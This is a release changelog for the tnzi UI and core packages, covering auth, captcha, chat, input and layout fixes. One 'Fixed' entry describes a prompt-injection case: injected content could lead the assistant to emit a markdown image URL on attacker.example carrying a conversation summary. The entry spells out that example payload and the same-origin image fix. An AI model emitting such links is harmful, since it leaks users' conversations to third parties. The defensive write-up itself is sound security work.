- `@tnzi/ui-ai`: `useChatThreads().selectThread` with the conversation on screen (the active thread, or the optimistic row of a new one) cancels an open still loading; the click used to do nothing and the other transcript replaced the screen a moment later. Selecting the thread already being opened returns that open's promise instead of loading it again, and a load that throws ends the opening and reports through `onError` (`load-thread`).
- `@tnzi/ui-ai`: `TChatApp` opens a thread at its latest turn, at once: after a thread had been scrolled up the next one opened at the same offset (its oldest messages), and after one left at the bottom the new transcript was smooth-scrolled through from the top.
- `@tnzi/ui` **(behaviour)**: `useFocusTrap` handles Escape and Tab only while it is the topmost open overlay. Every open trap used to act on every key press: one Escape closed a dialog together with the confirmation opened over it, and a trap under another one pulled Tab back into itself, so the dialog on top never got past its first control. It also ignores an Escape a control already handled (`event.preventDefault()`) and, given its root, keys from inside another `aria-modal` element above it (a modal that does not use the stack, such as naive-ui's). `TConfirm`, `TAppShell`'s drawer, and `@tnzi/ui-ai`'s `TSettingsDialog` and `TCommandPalette` get this through `useFocusTrap`.
- `@tnzi/ui-ai`: below `narrowBreakpoint` `TSettingsDialog` is a full-screen sheet (no radius, safe-area padding) whose section list and selected section are two screens, with a back button and the close button in the sheet's own header row; it opens on the section asked for through `activeSection`, otherwise on the list. Above the breakpoint the dialog is unchanged. `TChatApp` passes it the signal its sidebar drawer uses (`sidebarMobileBreakpoint` / `isMobile`); its plain "Settings" entries (account menu, sidebar footer, rail) open the sheet on the list while "Account" opens on Account, and the wide dialog still reopens on the section the user left.
- `@tnzi/ui-ai`: `TSettingRow` wraps its control under the label when the two do not fit side by side; on a wide pane nothing changes.

### Removed

- `@tnzi/ui` **(breaking)**: `ThemeSettings.isInfoFollowPrimary` and `recommendColor`, and those keys in the bundled presets. Nothing read them; info following primary is a setting of `@tnzi/ui-admin`'s theme store. A `ThemeSettings` literal that still sets them fails the excess-property check; drop them.
- `@tnzi/ui` **(breaking)**: `provideStoreRuntime`, `useStoreHttpClient`, `useStoreStorage`, `STORE_HTTP_CLIENT` and `STORE_STORAGE` from `@tnzi/ui/stores`. The stores never read the provided values, only the module-level runtime, so the "SSR-safe" channel isolated nothing. `createTnziUi({ httpClient, storage })` and `initStoreRuntime()` set that runtime as before; it is shared by every app on the page.
- `@tnzi/ui-ai` **(breaking for custom dictionaries)**: the `admin` and `persona` sections of `en` / `zhCn` / `AiLocaleMessages`. The admin pages moved to `@tnzi/ui-admin` and the persona picker was deleted; nothing read the 49 keys. A dictionary that still carries them fails the excess-property check; drop the two sections.
- `@tnzi/ui`: `useLoginCaptcha` (the picture-only state holder). Its job moved into `<TCaptcha>`, which owns the challenge for every provider; the login modules bind the component instead.
- `@tnzi/ui-admin`: the internal `TLoginCaptcha.vue` (now `@tnzi/ui`'s `<TImageCaptcha>`), and the `useLoginCaptcha` / `UseLoginCaptchaReturn` re-exports.
- `@tnzi/core`: the store adapter (`setStoreAdapter` / `useStore` / `resetStoreAdapter` / `createStoreAdapter` and the `StoreFactory`, `StoreOptions`, `StoreInstance`, `StoreGetters`, `StoreActions`, `StoreState`, `PersistOptions`, `StoreDepsInjection`, `WithDeps`, `ComputedRef` types). Its default only threw, pointing to a `createPiniaRuntime` that does not exist, and no UI package implemented it; the Pinia stores are wired through `initStoreRuntime` (or `createTnziUi({ httpClient })`).
- `@tnzi/core`: the `TOKEN_KEY` / `REFRESH_TOKEN_KEY` / `USER_KEY` / `API_TIMEOUT` constants. The three keys did not match what `AuthStateManager` stores (`tnzi:auth:token` / `:refresh` / `:expiry` by default), so clearing them left the real tokens in storage; use `logout()` / `clearAuth()`. `API_TIMEOUT` duplicated `DEFAULT_REQUEST_TIMEOUT`.
- `@tnzi/core`: `useAdminRoleApi().getList` (deprecated; the endpoint ignores every parameter, use `getAll` / `getPagedList`), `useAdminOrganizationApi().getList` (deprecated; same URL as `getTree`) and `useArtifactApi().getList` (the endpoint only lists one thread's artifacts; use `getByThread`).
- `@tnzi/core`: `useAuthApi().getCaptcha` (the PNG endpoint carries the captcha id in a response header that `client.download` does not return, so an answer could never be paired with its challenge; use `getCaptchaJson`).
- `@tnzi/core`: types with no backend counterpart and no reader: `FeatureFlagDto`, `FeatureRequirementDto`, `FeatureRequirementType`, `MaintenanceInfoDto`, `UpdateMaintenanceDto`, `CacheStatisticsDto`, `CachePrefixStatistics`, `ClearCacheDto`, `StorageProviderDto`, `PresignedUrlRequestDto`, `PresignedUrlResponseDto`, `FolderDto`, `CreateFolderDto` (use `FileFolderDto` / `CreateFileFolderDto`), `BulkFileOperationDto`, `ChunkUploadDto`, `ChunkUploadResultDto`, `StorageProviderType` / `getStorageProviderLabel` / `FileOperation`, `PaymentDetailDto`, `PaymentLogDto`, `PaymentChannelDto`, `CouponDto` / `CouponType` / `getCouponTypeLabel`, `TemplateVariableDto` / `TemplateVariableType`, `RenderTemplateDto`, `RenderedTemplateDto`, `TemplateCategoryDto`, `RecipientType`, `DigestFrequency`.
- `@tnzi/core`: fields the backend neither binds nor returns: `AccessLogQueryDto.userName` / `minResponseTime` / `maxResponseTime` / `isMobile` / `isBot` / `country` / `correlationId` (filtering on them returned the unfiltered list), the body, size, exception, correlation, coordinate and detailed user-agent fields of `AccessLogInfoDto` (now based on `CreationAuditedEntity`), `PaymentQueryDto.minAmount` / `maxAmount` / `startDate` / `endDate` / `paymentNo` (the range is `startTime` / `endTime`), `FileRecordDto.creatorName`, `UpdateEntityRoleDto.isEnabled`, `McpToolExposureOptionsDto.enableStreaming`, `KnowledgeDocumentDto.version`.
- `@tnzi/ui-admin` **(breaking)**: `useAdminModuleManifest` and its `AdminMenuNode` / `UseAdminModuleManifestOptions` / `UseAdminModuleManifestReturn` types. Its `menuTree` built links from the backend's API routes (`admin/users` became `/admin/users`), which match no admin page (`/admin/identity/users`), and nothing in the packages called it. Gate UI on loaded modules with `useModuleAvailability` (the `admin/shell/modules` signal the shell already uses); `fetchAdminManifest` stays for the diagnostics view of `admin/diagnostics/admin-manifest`.
- `@tnzi/ui-admin` **(breaking)**: `TnziUiAdminResolver`. It resolved names to deep `.vue` paths (`@tnzi/ui-admin/components/layout/TAdminShell.vue`) that the package `exports` map does not expose and `dist` does not ship, so the first auto-imported tag failed the Vite build; it was also exported only from the package root, which a `vite.config` cannot load on its own. Import admin components from `@tnzi/ui-admin` / `@tnzi/ui-admin/components`.
- `@tnzi/ui-admin` **(breaking)**: `TnziUiAdminOptions.globalSearchShortcut`, which nothing read, and the plugin's window-level Ctrl/Cmd-K listener, which `preventDefault`ed the combo app-wide (the browser's own Ctrl+K included, on the login page and with `builtinSearch: false`) to dispatch an event nothing listened to. `TAdminShell` still opens the global search on Ctrl/Cmd-K. `TnziUiAdminInstance.uninstall()` stays and has nothing left to release.
- `@tnzi/ui-ai` **(breaking for custom dictionaries)**: locale key `composer.micDenied`, replaced by the nine `composer.voice*` keys.

### Fixed

- `@tnzi/ui-ai`: a `stacked` `TSettingRow` no longer leaves an empty band (about 190px) between its description and its control. The text block's `flex: 1 1 12rem` is a width basis for the side-by-side row; in the stacked column it became a 12rem height.
- `@tnzi/ui-ai`: opening a tool run (or anything else that lays out an absolutely positioned element, such as a visually hidden label, deep in a scrolled region) no longer makes the page taller than the window. Every scroll container in the package is now a containing block (`position: relative`), so it places and clips what it scrolls: before, such elements belonged to the page, the document grew its own scrollbar and the `TChatApp` shell slid up when it was scrolled. Covers the conversation and `#view` scrollers, the sidebar's scrolling area, the landing page, overlays, code blocks, tool output and the artifact panel. A convention test keeps every scroller that way.
- `@tnzi/ui-admin`: an app that installs neither optional peer (`vue-draggable-plus`, `@tnzi/ui-ai`) builds again. The tab bar, the CRUD column settings popover and the workflow editor imported them statically, so Vite failed every such build with `MISSING_EXPORT` (a freshly scaffolded `tnzi init --ui ui-admin` app among them). The tab bar and the popover now load `vue-draggable-plus` on demand through `useDraggableComponent`, like the other reorderable surfaces: without it the tabs and rows render in a plain container and only pointer dragging is unavailable (the popover hides its drag handle). The workflow editor takes only types from `@tnzi/ui-ai/workflow` and loads `Handle` with the canvas. A convention test keeps both peers out of static imports.
- `@tnzi/ui`: theme mode `'auto'` follows OS colour-scheme changes. The theme context resolved it once, when chosen, so `<html>.dark`, the `--tnzi-*` variables and `isDark` kept the old scheme until a reload; the context and `TThemeSchemaSwitch` now listen to `prefers-color-scheme` while on `auto`, and drop the listener when the mode changes or the scope that created them ends. `resolveThemeMode` no longer throws where `MediaQueryList.addEventListener` is missing (Safari before 14); it resolves without following.
- `@tnzi/ui`: `useWorkbenchLayout` keeps pinned widgets at their declared positions once an order is saved (they moved to the front after the first drag), and keeps the saved order when `draggable` is switched off and back on (it was dropped from memory, and the next drag overwrote the stored one).
- `@tnzi/ui`: the naive message adapter's `loading()` inherited naive's 3 s default and vanished in the middle of the operation it covered; it stays until the returned closer runs (an explicit `duration` still applies).
- `@tnzi/ui`: `TDescriptions` with `maxColumns: N` laid out at most N - 1 columns, because the per-track floor `100% / N` left no room for the column gap that `auto-fit` counts. The floor now subtracts the gaps; the gap is `var(--t-desc-column-gap, 24px)`.
- `@tnzi/ui`: `TTable`'s `emptyText` was declared and never used; when set it is shown for an empty table (unset, naive's localized empty state shows).
- `@tnzi/ui`: `TWorkbenchLayout`'s draggable mode resolved spans with Tailwind breakpoints (768 / 1024) while the fixed mode's NGrid uses naive's (640 / 1024 / 1280 / 1536), so a widget changed width when drag-to-reorder was toggled; both use naive's now, and a span with only larger keys falls back to a full row below them as NGrid does. The `SpanValue` doc listed a third set of numbers.
- `@tnzi/ui`: a failed crop render in `TImageUpload` closed the dialog with nothing uploaded and no error; it emits `error` (`upload.cropFailed`).
- `@tnzi/ui-ai`: `AiThemeSnapshot.mode` is documented as a reserved field: nothing applies it and `TAppearanceAdmin` only keeps a stored value.
- `@tnzi/ui-ai`: `TMessageList` (the body of every embed widget) drew each assistant message's tool calls twice, keyed by tool name, so a tool called twice in one turn also produced duplicate Vue keys.
- `@tnzi/ui-ai`: `TToolCallDisplay` showed a running tool as a static clock: a live call is a name-only entry, and the spinner required a duration, which only arrives with the result. Both message renderers now pass `streaming`; a call with a duration and no reported outcome reads as finished.
- `@tnzi/ui-ai`: neither message renderer showed `message.feedbackRating`. `TChatMessage` passed a constant `null` to `TMessageFeedback`, so a second click re-submitted instead of revoking; `TThreadMessage`'s thumbs had no pressed state. Both reflect the rating now (`aria-pressed` plus the active style), including ratings loaded with a thread's history.
- `@tnzi/ui-ai`: `TMessageAttachments` and `TPromptInput` each kept their own file-icon mapping instead of `fileIconForName`, so a file showed one icon as a composer chip and another in the sent bubble.
- `@tnzi/ui-ai`: `TThreadComposer` checked `isComposing` only and sent on Safari's IME-commit Enter (keyCode 229); it uses `isImeComposing`. A refused microphone now shows a notice instead of the mic button silently flipping back.
- `@tnzi/ui-ai`: `useChatThreads` promises the draft intact when an attachment is refused, but `TChatApp`'s composer clears its `v-model` on send, so the prompt was lost with the file. The hook puts the draft back on refusal (unless the user typed something new meanwhile), and `TChatApp`'s landing composer refuses a second send while the first is still uploading.
- `@tnzi/ui-ai`: `useAgentExecution` settled tool results through a name-keyed map: one result ended every pending call of that tool and a second result for the same name was dropped. Each result now settles the first still-running call of its name.
- `@tnzi/ui-ai`: three `zh-cn` strings (`artifact.noPreview`, `embed.minimize`, `embed.expand`) were stored with U+FFFD in place of characters.
- `@tnzi/ui-ai` / `@tnzi/ui`: the Enter that commits an IME candidate (Chinese, Japanese, Korean input) acted as a submit. `TPromptInput`, the composer of every embed widget, sent the half-composed text; `TCommandPalette` ran the highlighted command (and its arrows moved the selection while the IME candidate list was open); the `TMessageFeedback` reason box and the `TAuthPage` fields submitted the text from before the composition; `@tnzi/ui`'s `TSearchForm` searched for it. All of them now leave that keystroke to the IME, and `useFocusTrap` no longer closes the dialog on the Escape that cancels a composition.
- `@tnzi/ui-ai`: Enter in `TPromptInput` while an answer streamed stopped the answer, because the key shared the button's Stop branch; a user typing the next question threw the running answer away. Enter now does nothing while `loading` (Stop stays on the button). A file over `maxFileSize` is reported above the input with the same notice `TThreadComposer` shows, instead of being dropped at selection without a word.
- `@tnzi/ui-ai`: `createTnziChat` turns had no identity. The aborted stream resolves cleanly, so after Stop the turn's tail re-marked the row `done` and the truncated answer lost its "Generation stopped" mark; a turn started while another ran (a host `sendMessage()`, or a send during an attachment upload) then had its streaming flag cleared and its abort handle nulled by the older turn's tail, leaving a reply nothing could cancel. Each server turn now carries a sequence number that Stop advances, and a superseded turn's tail touches nothing; a send while a reply streams (including the upload phase, which now shows Stop and can be cancelled) is ignored in both modes.
- `@tnzi/ui-ai`: a `createTnziChat` attachment refusal (a non-image without `uploadFile`, an oversized file, a failed upload) was reported only through the optional `onError`, after the composer had already cleared the draft and chips, so on a host page without `onError` (the documented example has none) the message vanished without a word. It is now a failed turn: the user row with the text and no attachments, then a row saying why; its Retry sends the same text and files again. `onError` is still called.
- `@tnzi/ui-ai`: `useChat().abort()` cleared `isStreaming` on the streaming row but set no `status`, so the "Generation stopped" mark never appeared; the row is now `status: 'stopped'`.
- `@tnzi/ui-ai`: on a deployment with password sign-in off and code sign-in on, `useAuthPage`'s Continue (and so `TAuthPage`) sent the login code outside `run()`. A refused send (rate limit, captcha required, bad address) rejected out of the click handler with nothing on screen, and with no busy state every further click sent another code. The send now shares `run()`'s busy flag and error line; on a refusal the page stays on the identify step.
- `@tnzi/ui-ai`: `useChatThreads().selectThread` moved `activeThreadId` before loading and never put it back. For the length of the load the previous thread's transcript stayed on screen under the new id, so a message typed then was shown under A, persisted into B, and wiped from the screen when B's history landed; a failed load kept that mismatch for good, and the row could not be clicked again because it already counted as open. `activeThreadId` and `messages` now switch together once the transcript arrives (the sidebar highlight moves then); a failed load leaves the open conversation as it was and reports through `onError`, and a send during the load stays in the open conversation and cancels the switch, as does deleting the thread being loaded. The `pageSize` option documents what it is: the list holds the newest `pageSize` threads and is not paged.
- `@tnzi/ui`: a refused password during quick registration left a passwordless account that could never be finished from the form. The default `register` callback creates the account (`quickRegister`, which spends the code) and then sets the password with the token it returned; the backend keeps that token valid after a refused password, but the callback dropped it, so every retry re-ran `quickRegister` and got "Email is already registered" (or a spent code). The callback now keeps the pending step per address and, when the same address is submitted again with the same code, retries only the password step. Applies to the admin login page and the ui-ai auth page alike.
- `@tnzi/ui-ai`: assistant markdown loaded remote images on render, a zero-click exfiltration path. `useStreamMarkdown` (and so `TStreamMarkdown` / `TMessageResponse` / `TReasoning`) escaped raw HTML but kept markdown-it's default image rule, so a prompt-injected document, web page or tool result could make the model emit `![](https://attacker.example/p?d=<conversation summary>)` and the browser fetched it the moment the answer appeared. Images now load automatically only from the page's own origin or inline `data:image`; any other image renders as a link (`class="t-md-image-link"`, `target="_blank"`, `rel="noopener noreferrer nofollow"`) labelled with its alt text. A custom `markdownIt` instance passed to `useStreamMarkdown` is used as given and does not get this rule.
- `@tnzi/core`: a tab could silently become another user. `AuthStateManager` adopts the refresh token another tab left in shared storage (so a rotation in one tab does not read as a replay in the next), but it adopted it whoever it belonged to. After another tab signed out and signed in as someone else, this tab's next refresh presented that user's token and carried on as them, while the page still showed the original user and their menus; signing out of that tab revoked the other user's session. A stored token is now adopted only when its access token carries the same user id (`nameid`); otherwise the tab ends its own session locally (`sessionEndReason` `'expired'`) without presenting the token, and a cookie-mode refresh that answers for another user ends it the same way. Signing out of a stale tab no longer refreshes or revokes with the other user's token, and no longer clears their persisted keys. Tokens whose user cannot be read (opaque tokens) are never adopted. New export `readUserIdClaim`.
- `@tnzi/core`: `HttpClient`'s `retry` option replayed writes. The retry loop never looked at the method, and a client-side timeout (408), a gateway 502/504 or a dropped connection (reported as 500) were all retryable, so a POST whose response was lost after the server committed was sent up to `maxRetries` more times and the record created two or three times behind one success. Only `GET` is retried now; `RetryConfig.retryMethods` lists further methods for endpoints the consumer knows to be idempotent. A request whose caller `signal` aborted is never sent again, and the backoff wait ends as soon as it aborts.
- `@tnzi/core` / `@tnzi/ui` / `@tnzi/ui-admin` / `@tnzi/ui-ai`: code entry follows the deployment's one-time code length. Emailed / texted codes are `Identity:Otp:CodeLength` digits (4-8, a runtime setting), but the two-factor sign-in boxes and `TStepUpModal` were fixed at 6, so a deployment configured for 8 made two-factor sign-in and step-up impossible. `AuthConfigDto` gains `otpCodeLength`; `@tnzi/core` adds `resolveOtpCodeLength` (6 when an older backend omits it), `codeLengthForMethod`, `DEFAULT_OTP_CODE_LENGTH` / `TOTP_CODE_LENGTH`, and `StepUpPromptController.codeLength` / `otpCodeLength` / the `loadOtpCodeLength` option; `@tnzi/ui` adds `LoginFeatures.otpCodeLength`. The two-factor instructions and the change-contact placeholder carry `{length}` in both locales. Authenticator (TOTP) codes stay 6, as the standard fixes them. `TStepUpModal`'s `codeLength` prop no longer defaults to 6: unset, it follows the controller.
- `@tnzi/core` / `@tnzi/ui` / `@tnzi/ui-admin`: an Altcha deployment could never verify, so every user was locked out from the moment the login captcha was demanded. The config's `challengeUrl` is a template relative to the API root (`captcha/altcha/challenge?purpose={purpose}`); the admin login modules mounted `<TCaptcha>` without a resolver, so the widget fetched it relative to the **page** (`/admin/captcha/...` → the SPA's `index.html`, "Server responded with invalid content-type"), and even a caller that did pass `http.resolveUrl` got `/apicaptcha/...` because `HttpClient.resolveUrl` is a plain `baseUrl + path` join. Now `resolveChallengeUrl` returns a client path with a leading slash (the same shape as `/captcha/config`), `useCaptchaWidget` refuses to mount an API-relative template without a `client` (the error names the missing piece instead of silently producing a widget that cannot work; `toFetchableChallengeUrl` is exported), `LoginContext` carries `resolveUrl`, and `TLoginPage` fills it from the client `createTnziUiAdmin({ client })` injected (new `resolveUrl` prop for a hand-mounted shell). `TAuthRoute` already passed the resolver and is fixed by the core change alone. **Second round, after a browser run against the real widget (3.2.2)**: the driver set only `challengeurl`, the 1.x / 2.x attribute; 3.x reads `challenge`, so its config stayed empty and it fetched the page itself. `mountAltcha` now sets `challenge` (and keeps `challengeurl`), and the backend's `GET /captcha/altcha/challenge` answers the bare Altcha document instead of the `ApiResult` envelope (the widget validates the body by its `challenge` key and rejected the envelope with "Challenge validation failed"). `@tnzi/core` gains `altcha@3.2.2` as a devDependency and `captcha-altcha-widget.test.ts`, which drives the real element through the driver and pins both the attribute and the accepted body shape.

- `@tnzi/ui-ai`: the adaptive login captcha picture rendered as a broken image - `imageBase64` is a bare base64 string and was bound to `<img :src>` without the `data:image/png;base64,` prefix.
- `@tnzi/ui-ai`: `TAuthPage` did not render at all. It read `captcha` from `useAuthPage` inside the `useCaptchaWidget` config getter before that destructuring ran, and the widget evaluates the getter immediately: a temporal-dead-zone `ReferenceError` in setup (development), or a getter that never tracked its dependencies so a script captcha never mounted and password sign-in could not complete (production). The vitest config now compiles SFCs, and a test mounts the page.
- `@tnzi/core`: a cancelled or timed-out WebAuthn dialog reported as an error. Browsers reject `navigator.credentials.create/get` with a `NotAllowedError` rather than resolving `null`, so the documented "`null` = dismissed" of `registerPasskey`, `signInWithPasskey`, `verifyTwoFactorWithPasskey` / `runTwoFactorPasskeyCeremony` and `stepUpWithPasskey` never held in a real browser: the two-factor challenge showed the browser's own error text and the key list a red toast. `NotAllowedError` now resolves `null`; every other rejection (e.g. `InvalidStateError` for an already-registered authenticator) still throws.
- `@tnzi/ui-admin`: `PwdLogin` kept a spent captcha after a failed attempt. The backend consumes the token on every attempt it checks, including one that then fails on the password, so the next submit was refused as a captcha failure whatever the user typed. The captcha is reset after any attempt that carried one and left it on screen.
- `@tnzi/ui`: a failed initial SMS / email second-factor code was swallowed and the challenge said "A new code has been sent." The default callbacks now report the failure on the challenge (`TwoFactorChallenge.codeSendError`); `TwoFactorChallenge` (admin) shows it with Resend available and no countdown running, and `useAuthPage` (ui-ai) shows it as the page error.
- `@tnzi/ui`: a password login answered with a second-factor or pending-action challenge left the captcha on screen, so `PwdLogin` reported "Captcha verification failed" and fetched another picture. The captcha is cleared on both challenges, as it already was on success.
- `@tnzi/core`: `useCaptchaWidget` could finish a mount into a container that had left the page (or after its scope was disposed) while the provider script was still loading, leaving a live widget that was never destroyed. Teardown now invalidates in-flight mounts.
- `@tnzi/ui-admin`: the two-factor status and sign-in policy reads resolved a refused envelope (503 with two-factor off, 403) to `null`; `TTwoFactorPanel` emitted `loaded` with it and `SecuritySection` crashed on `status.methods`. The bridge reads now reject with the server message, which the panel shows as a toast.
- `@tnzi/ui-admin`: `TTwoFactorPanel` and `TSignInPolicyPanel` applied a response for the previous `userId` after switching to another, so account A's allow-list could land in B's form and be saved to B. Only the latest load is applied, and the previous account's data is cleared on the switch.
- `@tnzi/ui-admin`: `TwoFactorChallenge` offered the passkey in browsers without the WebAuthn JSON bridges, and a second `finish` from the code boxes while a verification was in flight sent a second request. Both are guarded; `useAuthPage` (ui-ai) no longer offers the passkey in such a browser either.
- `@tnzi/ui`: `useLoadingBar` did not cancel the hide scheduled by `finish()`, so a `start()` within 250ms of it (a quick second navigation) had its bar hidden mid-way.
- `@tnzi/ui-ai`: `TArtifactCodeView` did not re-highlight when only the language changed, and it and `TCodeBlock` let a late Shiki pass overwrite a newer one. Both now go through `useCodeHighlight`, which gains a `debounceMs` option for streamed code.
- `@tnzi/ui`: `TCaptcha` rendered an empty box when the seed named a script provider but no usable `config` was given; it now shows an error naming the provider (new core locale key `auth.captchaNotConfigured`) and `execute()` rejects with it. A `reset()` the caller asked for no longer emits `expired`, which is reserved for the provider expiring the token.
- `@tnzi/ui-admin`: for a consumer without the runtime, `defineAdminApp` ran the post-login redirect after any wrapped login callback, including one that raised a second-factor, pending-action or captcha challenge, a dismissed passkey dialog, or a pending action with more still owed. The redirect now runs only when the callback reports a session.
- `@tnzi/core`: `DataQueryController` retried permanent failures. With `useCrudPage`'s default of 3 retries, a list the operator may not view cost four requests and about 2.1s of backoff before the 403 showed. A 4xx other than 408 / 429 (read structurally from `statusCode` or a numeric `code`, on a rejection or a failed envelope) is now final; network errors, timeouts, 5xx, 408 and 429 are still retried. A failed envelope reaches `errorObject` / `onError` as an `HttpError` carrying its status.
- `@tnzi/core`: `DataQueryController.resetFilter()` and `reset()` without an argument set the filter to `{}`, dropping the configured `defaultFilter`; they now return to a fresh copy of it. The constructor copies it too, so mutating `controller.filter` in place no longer changes the caller's object.
- `@tnzi/core`: `SelectionController.isAllSelected` compared counts, so with cross-page selection the next page read as fully selected and the header toggle then cleared every earlier pick. It and `isIndeterminate` now test membership of the current key set, and `toggleAll()` adds or removes only the current keys.
- `@tnzi/core`: `SortController` accepted `'ascending'` / `'descending'` but compared against `'asc'` / `'desc'` only, so a descending sort was requested ascending. The long spellings are folded into the short ones on the way in.
- `@tnzi/core`: `HttpClient` dropped a falsy request body (`false`, `0`, `''`), returned `data: undefined` for a 2xx body without envelope fields (so `useCaptchaApi().getAltchaChallenge()` never returned the challenge), and failed a 2xx with no body (204 / 205 / `Content-Length: 0`) as "Invalid JSON response". Falsy bodies are sent, a bare 2xx document is the payload, and an empty 2xx is a success; uploads follow the same rules.
- `@tnzi/core`: `resetAllRuntimes()` and the `reset*Adapter()` / `resetI18nRuntime()` helpers dropped only installed adapters and kept the built-in defaults, with the listeners on the default event bus and the locale `provideI18n` set. They now drop the defaults too, as the documented test / SSR isolation requires.
- `@tnzi/core`: `createZodSchema` let an empty string through a required string field; it now fails with `requiredMessage`. `EventBus.emit` iterated the live listener set, so a handler that subscribed during the emit ran in the same emit and a self re-arming `once` could keep it from returning; it iterates a snapshot.
- `@tnzi/core` / `@tnzi/ui-admin`: `LogSearchTruncation` lacked the backend's `Cancelled`; the log viewer has its label.
- `@tnzi/core`: `AuthStateManager.hasRole` / `hasPermission` / `hasAnyRole` / `hasAnyPermission` compared case-sensitively, while the backend and the `@tnzi/ui-admin` store ignore case; `hasRole('admin')` was false for a role stored as `Admin`. They ignore case now.
- `@tnzi/core`: `login()`, `applyTokenSession()` and `setAuth()` kept the previous identity's roles (and, for a user with no permission codes, its permission snapshot) when a session was established on top of another, such as accepting an invitation in a browser that had restored someone else. Identity state is cleared first, the roles come from the new profile, and a profile or permission answer that arrives after sign-out or a switch is dropped. A session without a refresh token or expiry removes those persisted keys instead of leaving the previous session's refresh token next to the new access token.
- `@tnzi/core`: every 401-driven token refresh waited for a full permission reload, inside the HttpClient's request timeout, before queued requests could retry; on a slow link a successful refresh could still time out and sign the user out. The refresh now returns once the token is stored and reloads permissions in the background; boot restores still wait for them before reporting a session.
- `@tnzi/core`: `UserStateManager.clear()` left a debounced persist pending, which wrote the `tnzi:user:*` keys back up to 300ms after sign-out. It uses the shared `debounce` and cancels it.
- `@tnzi/core`: `createFileUrlResolver` requested ids again that an open batch had already asked for, doubling the server's read checks while a list scrolled, and `clear()` did not stop a batch already out from caching the signed-out user's tokens afterwards. In-flight ids are joined, and a batch that answers after `clear()` caches nothing and settles its waiters with `null`.
- `@tnzi/core`: `getFilesByTag` and the MCP tool analytics calls put a free-text tag / tool name into the path unencoded (`Q1/2026` was a 404, `a#b` was cut at the fragment).
- `@tnzi/mobile`: `TPasswordReset` (and `usePasswordReset` / `useRegisterForm`) accepted an empty confirmation, so a typo in the only copy of the new password set a password the user did not know. `TForm`'s default min / max messages showed the literal `{min}` / `{max}`. `useDataList` appended a page that was in flight when `refresh()` or `reset()` replaced the list, and started page loads during a refresh.
- `@tnzi/core`: `HttpClient` failed a 2xx whose body is empty but whose length is not declared (a chunked empty 200) as "Invalid JSON response". The JSON request path now reads the body as text and treats an empty text as a success without `data`, as the upload path already did; a body that is there and does not parse still fails. A test that mocks `fetch` must give its response a `text()`.
- `@tnzi/core` / `@tnzi/ui` / `@tnzi/ui-admin` / `@tnzi/mobile`: a required text field accepted a value of only whitespace, which the backend's `[Required]` refuses, so the error moved from the field to a 400 (on sign-in, a failed attempt counted towards the lockout). `createZodSchema`, `useFormRules` (`userName` / `email` / `phone` / `url` / `password()` / `account()` / `emailOrPhone()` / `text()`), `@tnzi/ui`'s `TForm` (`convertFormRule` / `convertFormRules`), the admin login card and verification-code fields, the chat broadcast body, and `@tnzi/mobile`'s `TForm`, `TDynamicForm` and auth forms and composables now count it as missing; the value is not trimmed. `convertFormRule` also checks `required` on a rule that carries a `validator`, which async-validator never did.
- `@tnzi/ui-admin`: after a user switch without a sign-out the chat stayed disabled for the new user until the shell mounted again: the switch resets the chat config to disabled, and the shell probed `/chat/config` only when "could chat run" changed. The shell now probes once per chat store session (`useChatStore().ensureConfig()`), again after the store is claimed for another user, and never while signed out.
- `@tnzi/ui-ai`: `TSkillActivator` drew the required mark on a parameter and still emitted `activate` with it empty. Activate is disabled while a required parameter is empty or only whitespace; the values are passed on untrimmed.
- `@tnzi/ui-admin`: the Channels page keyed configuration binding rules by their fields, so two rules that differ only in scope, or are identical, shared a row key. They are keyed by their position in the binding list.
- `@tnzi/ui-ai`: opening a thread parsed every answer's markdown twice: `useStreamMarkdown` rendered once when the (already loaded) highlighter's promise settled and again in the frame `append` scheduled, and `TStreamMarkdown` mounted a message from history with an empty body that a second pass filled. A finished source is now parsed once and a message that is not streaming renders during mount. Opening a 100-message thread (50 markdown answers, 17 with tool cards) in Chrome: painted after 176 ms instead of 274 ms (median of 12; 1084 instead of 1261 ms at 4x CPU throttling), 50 parses instead of 100.
- `@tnzi/ui-ai`: `TSettingsDialog`'s content pane had no `min-width: 0`, so a section with a no-wrap row widened it past the dialog and `overflow: hidden` cut off its right side (measured at 768px: a 749px pane in a 707px dialog, the section's primary button entirely outside it). The pane now stays inside the dialog and scrolls what does not fit; long words wrap.
- `@tnzi/ui-ai`: `TSettingsDialog`'s section list was labelled "Settings sections" in every language; it reads `settings.sections`.
- `@tnzi/ui-ai`: in a page with a title area at the top, `TSettingsDialog` was centred in the whole viewport, so near a short window's minimum height its top edge and close button sat in that area (measured at 1024x520 with a 48px strip: top edge at 26px, close button at 43px). With `--tnzi-overlay-inset-top` it centres in the space below the strip.
- `@tnzi/ui-ai`: the copy button on a fenced code block in an answer read "Copy" (accessible name "Copy code") in every language: the markdown renderer wrote English literals into its HTML. `TStreamMarkdown` now hands the dictionary's `chat.copy` / `chat.copyCode` to the renderer and re-renders when the language changes. `TStreamLoader`'s accessible name was "Loading" plus an SVG `<title>Loader</title>`; it reads `common.loading` (or `label`) and the drawing is hidden from assistive technology.
- `@tnzi/ui-ai`: while a conversation opened, `TChatApp`'s top bar looked its title up in `threads` only, so a conversation a product lists in its own nav groups showed the brand name for the length of the load. It asks `threadTitleOf` first.

### Added (earlier, unreleased)

- `@tnzi/ui`: `TAttachmentWall` gains `reorderable` (off by default) + a `reorder` event carrying `AttachmentReorderPayload` (`attachments` / `orderedKeys` / `from` / `to` / `moved` / `revert()`). Reordering works by drag **and** by keyboard: Alt + arrow keys, Alt + Home/End, with a position in each tile's accessible name and an `aria-live` announcement per move. With `reorderable` off the rendered DOM is unchanged.
  - Dragging starts from a **grip** that appears on each tile, not from the tile at large. A `filter` list ("everything except the buttons and links is draggable") cannot work here: Sortable matches the filter against the press target *and its ancestors*, and a non-image tile is one `<a>` stretched over the whole tile — so a wall of PDFs would have ignored the mouse entirely. The grip also settles the click-versus-drag question on image tiles, which already open a lightbox.
  - Dragging needs the optional peer `vue-draggable-plus`, loaded on demand the first time `reorderable` is on. If it is absent the wall keeps every tile and the whole keyboard path, and loses only pointer dragging.
- `@tnzi/ui`: new headless primitive `useReorderable` (plus `useDraggableComponent`, `reorderKeyTarget`, `DraggableFallback`) exported from `@tnzi/ui/headless`. One implementation of drag-and-keyboard list reordering — the working copy, the mid-gesture guard, the Sortable option bag, the optimistic apply with `revert`, and the Alt-key mapping — now shared by `TAttachmentWall`, `TCardRenderer` and `TWorkbenchLayout`, which had each hand-copied it from the previous one.
